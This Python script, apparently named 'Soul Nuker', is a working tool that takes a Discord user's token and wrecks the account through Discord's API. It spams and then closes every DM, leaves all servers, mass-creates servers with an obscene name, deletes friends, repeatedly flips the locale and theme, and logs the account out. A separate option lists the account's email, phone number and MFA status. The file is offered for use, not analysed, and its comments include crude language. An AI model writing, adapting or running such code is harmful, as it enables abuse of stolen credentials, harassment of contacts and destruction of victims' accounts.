import requests, json, time, threading, colorama, os, ctypes
from datetime import datetime
from colorama import Fore, Back, Style

ctypes.windll.kernel32.SetConsoleTitleW("Soul Nuker | v1 ~ by array")

colorama.init(autoreset=True)
should_exit = False

SETTINGS = {
    "flash_screen": True,
    "create_guilds": True,
    "delete_guilds": True,
    "close_dms": True,
    "remove_friends": True,
}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def c_time():
    time_now = datetime.now()
    current_time = time_now.strftime("%H:%M:%S")
    return current_time

def get_headers(token):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://discordapp.com/channels/@me",
        "Origin": "https://discordapp.com",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "DNT": "1",
        "TE": "Trailers",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "X-Super-Properties": "eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkRpc2NvcmQgQ2xpZW50IiwicmVsZWFzZV9jaGFubmVsIjoiZGlzY29yZCIsInJlZmVycmVyIjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS8ifQ=="
    }

    return headers

def funny_flash(token):
    headers = get_headers(token)
    while not should_exit:
        requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers,
                        json={"locale": "zh-CN", "theme": "dark"})
        time.sleep(1)
        requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers,
                        json={"locale": "zh-CN", "theme": "light"})
        time.sleep(1)

def close_dms_spam(token, message):
    headers = get_headers(token)

    r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
    if r.status_code == 200:
        for channel in r.json():
            # send spam
            payload = {
                'content': message
            }
            requests.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages', headers=headers,
                          json=payload)

            # bye bye dm
            requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=headers)
            print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Closed DM with {channel["id"]}')
    print(f"{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done closing/spamming dms")

def nuke_guilds(token):
    headers = get_headers(token)

    # get guilds
    guild_ids = []
    url = 'https://discord.com/api/v9/users/@me/guilds'
    while url:
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            for guild in r.json():
                guild_ids.append(guild['id'])
            url = r.links.get('next', {}).get('url')
        elif r.status_code == 429: # Rate limited
            retry_after = r.headers.get('retry-after')
            print(f'{Fore.LIGHTYELLOW_EX}[{c_time()}]{Fore.WHITE} Rate limited, retry after {retry_after} seconds')
            time.sleep(int(retry_after) + 1)
        else:
            print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error getting guilds: {r.status_code} {r.text}')
            return

    # leave/rape all guilds
    for guild_id in guild_ids:
        url = f'https://discord.com/api/v9/users/@me/guilds/{guild_id}'
        while True:
            r = requests.delete(url, headers=headers)
            if r.status_code == 204:
                print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Left guild {guild_id}')
                break
            elif r.status_code == 429: # Rate limited
                retry_after = r.headers.get('retry-after')
                print(f'{Fore.LIGHTYELLOW_EX}[{c_time()}]{Fore.WHITE} Rate limited, retry after {retry_after} seconds')
                time.sleep(int(retry_after) + 1)
            else:
                print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error leaving guild {guild_id}: {r.status_code} {r.text}')
                pass
    print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done leaving guilds')

def nuke_account(token, message):
    headers = get_headers(token)

    # get user info
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code != 200:
        print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error getting user info: {response.status_code} {response.text}')
        return

    if SETTINGS["create_guilds"]:
        # Create servers
        for i in range(30):
            payload = {
                'name': f'FUCKED BY SOUL NUKER-{i}',
                'region': 'us-west'
            }
            response = requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
            if response.status_code == 201:
                server_id = response.json()['id']
                print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Created server {server_id}')

                payload = {'content': message}
                response = requests.post(f'https://discord.com/api/v9/channels/{server_id}/messages', headers=headers, json=payload)

            elif response.status_code == 429:
                retry_after = response.headers.get('retry-after')
                print(f'{Fore.LIGHTYELLOW_EX}[{c_time()}]{Fore.WHITE} Rate limited, retry after {retry_after} seconds')
                time.sleep(int(retry_after) + 1)
                
            else:
                print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error creating server: {response.status_code} {response.text}')

        print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done creating guilds')


    elif SETTINGS["remove_friends"]:
        # Delete all friends
        response = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
        if response.status_code == 200:
            for relationship in response.json():
                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{relationship["id"]}', headers=headers)
                print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Removed friend: {relationship["id"]}')
        print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Finished removing all friends')

    # Close session
    requests.post('https://discord.com/api/v9/auth/logout', headers=headers)
    print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Nuke complete')

def toggle_setting(setting):
    SETTINGS[setting] = not SETTINGS[setting]

def display_settings():
    clear_screen()
    sel = ["1", "2", "3", "4", "5", "return", "0"]
    print(f"""
    
        [1] Flash screen: {SETTINGS['flash_screen']}
        [2] Create servers: {SETTINGS['create_guilds']}
        [3] Remove servers: {SETTINGS['delete_guilds']}
        [4] Close dms: {SETTINGS['close_dms']}
        [5] Remove friends: {SETTINGS['remove_friends']}
    
        To change type the number of the setting.
        To return type the "return" or "0".
        
    """)
    x = input("     [?] ")
    if x not in sel:
        clear_screen()
        display_settings()
    elif x in ["1", "2", "3", "4", "5"]:
        toggle_setting(list(SETTINGS.keys())[int(x)-1])
        display_settings()
    elif x in ["return", "0"]:
        clear_screen()
        display_menu()

def display_menu():
    tabs = ["1", "2", "3"]
    print(f"""
{Fore.LIGHTBLACK_EX}
                         __               __            
       _________  __  __/ /  ____  __  __/ /_____  _____
      / ___/ __ \/ / / / /  / __ \/ / / / //_/ _ \/ ___/
     (__  ) /_/ / /_/ / /  / / / / /_/ / ,< /  __/ /    
    /____/\____/\__,_/_/  /_/ /_/\__,_/_/|_|\___/_/     
                                                    
        
        
    {Fore.LIGHTBLACK_EX}[1]{Fore.WHITE} Nuker
    {Fore.LIGHTBLACK_EX}[2]{Fore.WHITE} Nuker settings
    {Fore.LIGHTBLACK_EX}[3]{Fore.WHITE} Get token info
        
    """)

    # Display and validate user input
    x = input(f"    {Fore.LIGHTBLACK_EX}[?]{Fore.WHITE} ")
    if x not in tabs:
        clear_screen()
        display_menu()
    elif x == "1":
        clear_screen()
        nuke_button()
    elif x == "2":
        clear_screen()
        display_settings()
    elif x == "3":
        clear_screen()
        info_token()

def info_token():
    while True:
        token = input("[?] Token: ")
        response = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token))
        
        if response.status_code == 200:
            try:
                user_info = response.json()
            except json.decoder.JSONDecodeError as e:
                print(f"[-] Error decoding JSON: {e}")
                continue
                
            break
        else:
            print("[-] Token invalid, please try again")

    print("[+] User Info:")
    print(f" - ID:              {user_info['id']}")
    print(f" - Username:        {user_info['username']}#{user_info['discriminator']}")
    print(f" - Email:           {user_info['email'] or 'N/A'}")
    print(f" - Phone:           {user_info['phone'] or 'N/A'}")
    print(f" - Avatar URL:      {user_info['avatar']}")
    print(f" - Flags:           {user_info['flags']}")
    print(f" - Locale:          {user_info['locale']}")
    print(f" - Verified:        {user_info['verified']}")
    print(f" - MFA Enabled:     {user_info['mfa_enabled']}")
    
    input("\n[!] Press any key to return")
    clear_screen()
    display_menu()

def nuke_button():
    token = input("[?] Token: ")

    response = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token))
    if response.status_code == 200:
        if SETTINGS["close_dms"]:
            message = input("[?] Spam message (leave blank for no spam before closing): ")
        else:
            message = ''

        if SETTINGS["flash_screen"]:
            flash = threading.Thread(target=funny_flash, args=(token,))
            flash.start()
        elif SETTINGS["close_dms"]:
            close_dm = threading.Thread(target=close_dms_spam, args=(token, message,))
            close_dm.start()
        elif SETTINGS["delete_guilds"]:
            remove_guilds = threading.Thread(target=nuke_guilds, args=(token,))
            remove_guilds.start()

        nuke_account(token, message)
    else:
        print("[-] Token invalid, please try again")
        time.sleep(2)
        nuke_button()

display_menu()

# arrayy.xyz